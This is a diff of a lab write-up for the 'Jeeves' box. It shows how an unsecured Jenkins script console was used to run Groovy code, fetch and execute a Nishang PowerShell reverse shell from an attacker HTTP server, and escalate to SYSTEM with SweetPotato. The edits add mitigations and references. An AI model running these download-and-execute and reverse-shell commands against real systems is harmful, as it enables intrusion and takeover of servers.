@@ -8,7 +8,11 @@
 
 ## Introduction
 
+The Jeeves box gives two fun ways to get a low level shell and escalate privileges in ways that come up often in different forms.  
 
+## Summary 
+
+The target host was locked down well with the major acception of a service that was unsecured and allowed the tester to run malicious code on the server leading to access to the server. This issue can be remided by enabling access controls. The final issue is one that may remain unchanged dependant on needs.
 
 ## Jeeves
 
@@ -84,7 +88,7 @@ ________________________________________________
 
 ```
 
-The ffuf found the "askjeeves" endpoint. This showned that the host is running the jenkins service. Jenkins has a script console that allows user to run "groovy" scripts on the server. The tester used the following script to test code execution:
+The ffuf tool found the "askjeeves" endpoint. This showned that the host is running the jenkins service. Jenkins has a script console that allows user to run "groovy" scripts on the server. The tester used the following script to test code execution:
 
 ```
 def process = "whoami".execute()
@@ -101,7 +105,7 @@ Output: jeeves\kohsuke
 Exit code: 0
 ```
 
-The tester next started a shell on the host by downloading and invoking [this](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) powershell script. The tester set up a HTTP server using python and a Netcat listener then used the beolow script to download and run the shell.
+The tester next started a shell on the host by downloading and invoking [this](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) powershell script. The tester set up a HTTP server using python and a Netcat listener. Then used the below script to download and run the shell.
 
 ```
 def process = "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6:8083/Invoke-PowerShellTcp.ps1')".execute()
@@ -124,8 +128,7 @@ jeeves\kohsuke
 PS C:\Users\Administrator\.jenkins> 
 ```
 
-This gave access to the host as the "kohsuke" user. The tester checked the users privileges and found that the user had the SeImpersonatePrivilege privilege. This privilege allows a user to imperonate process tokens.
-
+This gave access to the host with the "kohsuke" account. The tester checked the account privileges and found that the account had the SeImpersonatePrivilege privilege. This privilege allows a user to imperonate process tokens.
 
 ```
 PS C:\Users\Administrator\.jenkins> whoami /priv
@@ -145,8 +148,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 PS C:\Users\Administrator\.jenkins> 
 ```
 
-The tester used the "sweetpotato" binary to exploit this vulnerability and get system. The tester used another HTTP server to download the binary.
-
+The tester used the "sweetpotato.exe" binary to exploit this vulnerability and get system. The tester used another HTTP server to download the binary.
 
 ```
 PS C:\users\public\music> wget "http://10.10.14.8:8080/SweetPotato.exe" -outfile "/users/public/music/sweetpotato.exe"
@@ -159,9 +161,9 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 10.10.10.63 - - [23/Dec/2023 18:03:34] code 404, message File not found
 10.10.10.63 - - [23/Dec/2023 18:03:34] "GET /sweetpotato.exe HTTP/1.1" 404 -
 10.10.10.63 - - [23/Dec/2023 18:03:56] "GET /SweetPotato.exe HTTP/1.1" 200 -
-
 ```
-Once the binary had been downloaded the tester tested the exploit by running the "whoami" command with it which return the system account. The tester used the same process used previouly to get get a system shell. 
+
+Once the binary had been downloaded the tester tested the exploit by running the "whoami" command, which returned the system account. The tester used this process to get a system shell. 
 
 ```
 PS C:\users\public\music> wget "http://10.10.14.8:8080/SweetPotato.exe" -outfile "/users/public/music/sweetpotato.exe"
@@ -190,11 +192,10 @@ nt authority\system
 PS C:\users\public\music> 
 
 ```
-The tester ran the download and invoke command using the exploit binary which gave a system shell.
+The tester used the download and invoke command using the exploit binary to start a system reverse shell.
 ```
 PS C:\users\public\music> ./sweetpotato.exe -a "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8:8080/Invoke-PowerShellTcp.ps1')"  
 ```
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -211,9 +212,16 @@ Jeeves
 PS C:\Windows\system32> 
 ```
 
-
 ## Mitigations 
 
+- Enable access controls for the jenkins service.
+- Remove Jenkins access from the frontend if possible.
+- Review account privileges.
+
 ## References
+
+https://www.jenkins.io/doc/book/security/access-control/
+https://www.jenkins.io/doc/book/security/securing-jenkins/
 https://github.com/uknowsec/SweetPotato
 https://github.com/samratashok/nishang
+
